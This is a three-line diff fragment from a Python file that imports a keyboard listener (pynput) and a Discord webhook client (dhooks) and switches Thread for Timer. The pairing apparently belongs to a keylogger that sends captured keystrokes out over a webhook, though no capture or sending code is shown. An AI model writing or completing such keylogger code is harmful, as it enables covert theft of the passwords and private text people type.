@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener
-from threading import Thread
+from threading import Timer
 from dhooks import Webhook
 
 
